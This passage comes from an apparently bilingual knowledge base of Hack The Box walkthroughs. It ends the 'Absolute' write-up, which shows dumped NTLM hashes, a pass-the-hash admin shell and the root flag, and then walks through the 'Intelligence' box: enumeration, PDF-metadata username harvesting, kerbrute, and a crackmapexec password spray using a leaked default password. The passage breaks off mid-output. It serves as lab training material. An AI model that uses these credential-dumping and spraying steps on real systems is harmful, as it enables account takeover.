SMB         dc.absolute.htb 445    DC               c.colt:1111:aad3b435b51404eeaad3b435b51404ee:fcad808a20e73e68ea6f55b268b48fe4:::
SMB         dc.absolute.htb 445    DC               s.johnson:1112:aad3b435b51404eeaad3b435b51404ee:b922d77d7412d1d616db10b5017f395c:::
SMB         dc.absolute.htb 445    DC               d.lemm:1113:aad3b435b51404eeaad3b435b51404ee:e16f7ab64d81a4f6fe47ca7c21d1ea40:::
SMB         dc.absolute.htb 445    DC               svc_smb:1114:aad3b435b51404eeaad3b435b51404ee:c31e33babe4acee96481ff56c2449167:::
SMB         dc.absolute.htb 445    DC               svc_audit:1115:aad3b435b51404eeaad3b435b51404ee:846196aab3f1323cbcc1d8c57f79a103:::
SMB         dc.absolute.htb 445    DC               winrm_user:1116:aad3b435b51404eeaad3b435b51404ee:8738c7413a5da3bc1d083efc0ab06cb2:::
SMB         dc.absolute.htb 445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:a7864ab463177acb9aec553f18f42577:::
SMB         dc.absolute.htb 445    DC               [+] Dumped 18 NTDS hashes to /root/.cme/logs/DC_dc.absolute.htb_2023-05-31_120153.ntds of which 17 were added to the database
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute20.png)

#### Evil-WinRM

从winrm_user的shell中，很明显，administrator不在*Protected Users用户组中:

``` bash
*Evil-WinRM* PS C:\Users\winrm_user\Documents> net user administrator
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/9/2022 1:25:57 AM
Password expires             Never
Password changeable          6/10/2022 1:25:57 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/31/2023 9:05:00 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *Schema Admins
                             *Enterprise Admins    *Domain Admins
                             *Group Policy Creator
The command completed successfully.
```

administrator的NTLM hash可以用来获取一个作为administrator的shell:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# evil-winrm -i 10.10.11.181 -u administrator -H 1f4a6093623653f6488d5aa24c75f2ea

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
absolute\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\desktop\root.txt
e9cefad9242174ae18798c39f2c275d5
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute21.png)

#### Reference Sources

 - [0xdf's blog absolute walkthrough](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html)
 - [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
 - [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
 - [kerbrute](https://github.com/ropnop/kerbrute)
 - [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 - [BloodHound.py](https://github.com/fox-it/BloodHound.py)
 - [KrbRelay](https://github.com/cube0x0/KrbRelay)
 - [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)

<!-- kb:end htb-absolute -->

</details>

<a id="case-intelligence"></a>

## DNS 记录、gMSA 与服务委派

PDF 元数据用于账户识别，DNS 更新触发认证请求，后续读取 gMSA 并请求服务票据。时钟同步和服务 SPN 是原环境的重要条件。

<p class="kb-provenance">来源 intelligence · 原记录 2021-07-10 · 31 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-intelligence">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start intelligence -->

#### introduce

OS: Windows
Difficulty: Medium
Points:	30
Release:	03 Jul 2021
IP:	10.10.10.248

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2012.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration

use nmap as usual

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.248
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-10 10:05:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
64420/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Looks like a normal Active Directory setup for windows OS.

#### SMB
#### Enum4linux

``` bash
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul  4 07:18:41 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... intelligence.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================== 
|    Enumerating Workgroup/Domain on intelligence.htb    |
 ======================================================== 
[E] Can't find workgroup/domain


 ================================================ 
|    Nbtstat Information for intelligence.htb    |
 ================================================ 
Looking up status of 10.129.80.199
No reply from 10.129.80.199

 ========================================= 
|    Session Check on intelligence.htb    |
 ========================================= 
[+] Server intelligence.htb allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 =============================================== 
|    Getting domain SID for intelligence.htb    |
 =============================================== 
Domain Name: intelligence
Domain Sid: S-1-5-21-4210132550-3389855604-3437519686
[+] Host is part of a domain (not a workgroup)

 ========================================== 
|    OS information on intelligence.htb    |
 ========================================== 
[+] Got OS info for intelligence.htb from smbclient: 
[+] Got OS info for intelligence.htb from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ================================= 
|    Users on intelligence.htb    |
 ================================= 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ============================================= 
|    Share Enumeration on intelligence.htb    |
 ============================================= 

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on intelligence.htb

 ======================================================== 
|    Password Policy Information for intelligence.htb    |
 ======================================================== 
[E] Unexpected error from polenum:


[+] Attaching to intelligence.htb using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:INTELLIGENCE.HT)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


[E] Failed to get password policy with rpcclient


 ================================== 
|    Groups on intelligence.htb    |
 ================================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 =========================================================================== 
|    Users on intelligence.htb via RID cycling (RIDS: 500-550,1000-1050)    |
 =========================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ================================================= 
|    Getting printer info for intelligence.htb    |
 ================================================= 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sun Jul  4 07:19:54 2021
```

Nothing much from here so let's try anonymous login.

#### Anonymous Login

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# smbclient -L //intelligence.htb
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

We have anonymous login but we have access to shares so let's enumerate further.

#### LDAP

let's do an ldap search for getting naming context for the AD(Active Directory).

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# ldapsearch -x -h intelligence.htb -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=intelligence,DC=htb
namingcontexts: CN=Configuration,DC=intelligence,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb
namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb
namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Looks like it's normal intelligence.htb so let's move on from there.

#### Web

Looking through the webpage we can see we can get two PDF so maybe we can get some username from it's exifdata.
so let's get the two PDF's.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# wget http://intelligence.htb/documents/2020-01-01-upload.pdf
--2021-07-09 23:58:06--  http://intelligence.htb/documents/2020-01-01-upload.pdf
正在解析主机 intelligence.htb (intelligence.htb)... 10.10.10.248
正在连接 intelligence.htb (intelligence.htb)|10.10.10.248|:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：26835 (26K) [application/pdf]
正在保存至: “2020-01-01-upload.pdf”

2020-01-01-upload.pdf            100%[========================================================>]  26.21K  --.-KB/s  用时 0.1s    

2021-07-09 23:58:06 (188 KB/s) - 已保存 “2020-01-01-upload.pdf” [26835/26835])

┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# wget http://intelligence.htb/documents/2020-12-15-upload.pdf                                                                  
--2021-07-09 23:58:18--  http://intelligence.htb/documents/2020-12-15-upload.pdf
正在解析主机 intelligence.htb (intelligence.htb)... 10.10.10.248
正在连接 intelligence.htb (intelligence.htb)|10.10.10.248|:80... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：27242 (27K) [application/pdf]
正在保存至: “2020-12-15-upload.pdf”

2020-12-15-upload.pdf            100%[========================================================>]  26.60K   112KB/s  用时 0.2s    

2021-07-09 23:58:19 (112 KB/s) - 已保存 “2020-12-15-upload.pdf” [27242/27242])
```

So now let's try and see it's exifdata from that PDF.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 12.16
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2021:07:09 23:58:06-04:00
File Inode Change Date/Time     : 2021:07:09 23:58:06-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# exiftool 2020-12-15-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 KiB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2021:07:09 23:58:19-04:00
File Inode Change Date/Time     : 2021:07:09 23:58:19-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

Looks like we have two usernames Jose.Williams and William.Lee so let's create a wordlist with different combination from their names and then brute it with kerbrute.

#### Kerberos

Thinking about the wordlist I came up with this wordlist below.

``` bash
Administrator
Guest
William
Jose.Williams 
William.Lee
Jwilliams
JWilliams
WLee
Wlee
LWilliams
Lwilliams
WJose
Wjose
wJose
wjose
lWilliams
lwilliams
wlee
wLee
jWilliams
jwilliams
```

In this case you don't need to create this wordlist cause the author name is one of the usernames but in Real like scenario or the in some difficult CTF you might need to create the wordlist as above.

Let's move on and try kerbrute on the AD.

``` bash
kali@kali:~/HackTheBox/Intelligence$ ~/Git/kerbrute/dist/kerbrute userenum --dc intelligence.htb -d intelligence.htb user.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (1ad284a) - 07/04/21 - Ronnie Flathers @ropnop

2021/07/04 07:37:21 >  Using KDC(s):
2021/07/04 07:37:21 >   intelligence.htb:88

2021/07/04 07:37:22 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/07/04 07:37:22 >  [+] VALID USERNAME:       Administrator@intelligence.htb
2021/07/04 07:37:22 >  Done! Tested 21 usernames (2 valid) in 0.804 seconds
```
So now we have two users before bruting the password let's try and check for some low hanging fruits like GetNpuser.
Got nothing from that so I though that there could be something else so I went on to check PDF's.

#### Web

So I checked the naming of PDF is using the date and then followed by upload. so I tried to brute all the dates to get if there are anymore PDF's.
The below script will create a new PDF directory and download all pdf in that directory.

``` python
#!/usr/bin/python3

import requests
import os

url = 'http://intelligence.htb/documents/'

for i in range(2020,2022):
	for j in range(1,13):
		for k in range(1,31):
			date = f'{i}-{j:02}-{k:02}-upload.pdf'
			r = requests.get(url+date)
			#print (r.text)
			if (r.status_code == 200):
				print (date)
				#text = r.text
				os.system('mkdir pdf')
				os.system(f'wget {url}{date} -O pdf/{date}')
```

Now as the nummber of PDF files was more I wrote another python script to extract
the usernames.

``` python
#!/usr/bin/python3

from pwn import *

io = process('/bin/sh')
io.sendline('ls -al pdf/')
lst = io.recvrepeat(1).decode().strip().split('\n')
files = []
for i in range(3,len(lst)):
	tmp = lst[i].split(' ')
	files.append(tmp[10])
#print (files)
f = open('users.txt','w')
for i in files:
	io.sendline(f'exiftool pdf/{i}')
	tmp = (io.recvrepeat(1).decode().strip().split(': '))
	f.write(tmp[-1] + '\n')
	print (tmp[-1])

f.close()
```

And it will create users.txt for you.
now after getting users.txt you can retry NPUsers.py but it won't help so let's dig more into PDF.
Now searching for password in pdf I wrote this simple python script to make my job easy.

```python
#!/usr/bin/python3

from pdfminer.high_level import extract_text

files = ['2020-01-01-upload.pdf', '2020-01-02-upload.pdf', '2020-01-04-upload.pdf', '2020-01-10-upload.pdf', '2020-01-20-upload.pdf', '2020-01-22-upload.pdf', '2020-01-23-upload.pdf', '2020-01-25-upload.pdf', '2020-01-30-upload.pdf', '2020-02-11-upload.pdf', '2020-02-17-upload.pdf', '2020-02-23-upload.pdf', '2020-02-24-upload.pdf', '2020-02-28-upload.pdf', '2020-03-04-upload.pdf', '2020-03-05-upload.pdf', '2020-03-12-upload.pdf', '2020-03-13-upload.pdf', '2020-03-17-upload.pdf', '2020-03-21-upload.pdf', '2020-04-02-upload.pdf', '2020-04-04-upload.pdf', '2020-04-15-upload.pdf', '2020-04-23-upload.pdf', '2020-05-01-upload.pdf', '2020-05-03-upload.pdf', '2020-05-07-upload.pdf', '2020-05-11-upload.pdf', '2020-05-17-upload.pdf', '2020-05-20-upload.pdf', '2020-05-21-upload.pdf', '2020-05-24-upload.pdf', '2020-05-29-upload.pdf', '2020-06-02-upload.pdf', '2020-06-03-upload.pdf', '2020-06-04-upload.pdf', '2020-06-07-upload.pdf', '2020-06-08-upload.pdf', '2020-06-12-upload.pdf', '2020-06-14-upload.pdf', '2020-06-15-upload.pdf', '2020-06-21-upload.pdf', '2020-06-22-upload.pdf', '2020-06-25-upload.pdf', '2020-06-26-upload.pdf', '2020-06-28-upload.pdf', '2020-06-30-upload.pdf', '2020-07-02-upload.pdf', '2020-07-06-upload.pdf', '2020-07-08-upload.pdf', '2020-07-20-upload.pdf', '2020-07-24-upload.pdf', '2020-08-01-upload.pdf', '2020-08-03-upload.pdf', '2020-08-09-upload.pdf', '2020-08-19-upload.pdf', '2020-08-20-upload.pdf', '2020-09-02-upload.pdf', '2020-09-04-upload.pdf', '2020-09-05-upload.pdf', '2020-09-06-upload.pdf', '2020-09-11-upload.pdf', '2020-09-13-upload.pdf', '2020-09-16-upload.pdf', '2020-09-22-upload.pdf', '2020-09-27-upload.pdf', '2020-09-29-upload.pdf', '2020-09-30-upload.pdf', '2020-10-05-upload.pdf', '2020-10-19-upload.pdf', '2020-11-01-upload.pdf', '2020-11-03-upload.pdf', '2020-11-06-upload.pdf', '2020-11-10-upload.pdf', '2020-11-11-upload.pdf', '2020-11-13-upload.pdf', '2020-11-24-upload.pdf', '2020-11-30-upload.pdf']
#keywords = ['user','username','pass','password']
keywords = 'user'

for i in files:
	text = extract_text('pdf/'+i)
	if(keywords in text):
		print (i)
		print (text)
```

So this will give you the following output.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# python3 getpass.py 
2020-06-04-upload.pdf
New Account Guide

Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876

After logging in please change your password as soon as possible.
```

So now we have default password so let's try and spray that password at our username I tried kerbrute but didn't yeild anything then I tried crackmapexec.

#### Crackmapexec

``` bash
┌──(root💀kali)-[~/hackthebox/machine/intelligence]
└─# crackmapexec smb 10.10.10.248 -u users.txt -p NewIntelligenceCorpUser9876
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```
Look like we have password for Tiffany.Molina

#### smbmap

``` bash
[\] Working on it...
[+] IP: intelligence.htb:445	Name: unknown                                           
[-] Working on it...
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	.\IPC$\*
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	lsass
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	scerpc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-39c-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	epmapper
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-1b8-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	eventlog
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-394-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	atsvc
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	wkssvc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-258-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-4e8-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-258-1
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\49677
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	01c597a227e270af
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\593
	fr--r--r--                5 Sun Dec 31 23:58:45 1600	srvsvc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	efsrpc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	netdfs
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	vgauth-service
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-240-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	W32TIME_ALT
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	cert
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-9f0-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-a7c-0
